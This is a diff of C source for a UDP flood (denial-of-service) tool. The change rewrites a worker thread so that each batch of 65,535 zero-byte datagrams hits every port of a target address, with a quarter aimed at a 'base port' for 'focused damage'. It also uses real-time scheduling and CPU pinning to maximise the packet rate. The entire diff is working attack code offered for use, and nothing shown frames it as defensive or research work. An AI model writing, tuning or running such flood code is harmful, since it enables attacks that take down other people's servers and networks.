@@ -98,7 +98,6 @@ typedef struct {
 
 #define MEGA_W_BATCH 65535   /* full power — matches base fjium-pps.c */
 #define MEGA_W_BURST 64      /* matches base BURST_MULTIPLIER */
-#define MEGA_W_RING  1048576
 
 static void *mega_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -107,30 +106,39 @@ static void *mega_worker(void *arg) {
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
     /* MEGA: full power — WS thread is SCHED_FIFO(99) so it always preempts */
-    /* MATCH BASE: batch 65535, iov_len=0 zero-byte UDP = max pps, no payload copy */
+    /* 65535 dest addresses: one PER DATAGRAM → all ports hit simultaneously */
     size_t m_sz = sizeof(struct mmsghdr) * MEGA_W_BATCH;
     size_t v_sz = sizeof(struct iovec) * MEGA_W_BATCH;
+    size_t d_sz = sizeof(struct sockaddr_in) * MEGA_W_BATCH; /* 65535 × 16 ≈ 1MB */
     struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
-                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     struct iovec *iovs = mmap(NULL, v_sz, PROT_READ | PROT_WRITE,
-                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    char *ring = mmap(NULL, MEGA_W_RING, PROT_READ | PROT_WRITE,
-                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
+                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    struct sockaddr_in *dests = mmap(NULL, d_sz, PROT_READ | PROT_WRITE,
+                                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (msgs == MAP_FAILED || iovs == MAP_FAILED || dests == MAP_FAILED) {
         if (msgs != MAP_FAILED) munmap(msgs, m_sz);
         if (iovs != MAP_FAILED) munmap(iovs, v_sz);
-        if (ring != MAP_FAILED) munmap(ring, MEGA_W_RING);
+        if (dests != MAP_FAILED) munmap(dests, d_sz);
         return NULL;
     }
-    memset(ring, 0, MEGA_W_RING);
 
+    /* Pre-fill dest addresses: each datagram gets UNIQUE port (1-65535) */
     for (int i = 0; i < MEGA_W_BATCH; i++) {
-        iovs[i].iov_base = &ring[i & (MEGA_W_RING - 1)];
+        dests[i].sin_family = AF_INET;
+        dests[i].sin_addr = mt->target.sin_addr;
+        uint16_t port = (uint16_t)((i % 65535) + 1);
+        /* 25% of datagrams hit the base port (focused damage) */
+        if ((i & 3) == 0) port = (uint16_t)mt->port_base;
+        if (port == 0) port = 1;
+        dests[i].sin_port = htons(port);
+
+        iovs[i].iov_base = &dests[i]; /* any valid ptr, iov_len=0 so data unused */
         iovs[i].iov_len = 0;
         msgs[i].msg_hdr.msg_iov = &iovs[i];
         msgs[i].msg_hdr.msg_iovlen = 1;
-        msgs[i].msg_hdr.msg_name = &mt->target;
-        msgs[i].msg_hdr.msg_namelen = sizeof(mt->target);
+        msgs[i].msg_hdr.msg_name = &dests[i];
+        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
         msgs[i].msg_hdr.msg_control = NULL;
         msgs[i].msg_hdr.msg_controllen = 0;
         msgs[i].msg_hdr.msg_flags = 0;
@@ -147,14 +155,6 @@ static void *mega_worker(void *arg) {
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
-        /* 25% targeted hits on base port, 75% spread across all 65535 ports */
-        uint16_t dp;
-        if ((rand() & 3) == 0)
-            dp = (uint16_t)mt->port_base;
-        else
-            dp = (uint16_t)((rand() % 65535) + 1);
-        if (dp == 0) dp = 1;
-        mt->target.sin_port = htons(dp);
 
         for (int s = 0; s < mt->sock_count && !is_attack_stop(); s++) {
             for (int b = 0; b < MEGA_W_BURST && !is_attack_stop(); b++) {
@@ -171,14 +171,13 @@ static void *mega_worker(void *arg) {
                 while (recvmsg(mt->socks[s], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
             }
 #endif
-            /* Yield CPU every few sockets so SCHED_FIFO(99) WS thread can preempt */
             if ((s & 7) == 7) sched_yield();
         }
     }
 
     munmap(msgs, m_sz);
     munmap(iovs, v_sz);
-    munmap(ring, MEGA_W_RING);
+    munmap(dests, d_sz);
     return NULL;
 }
 
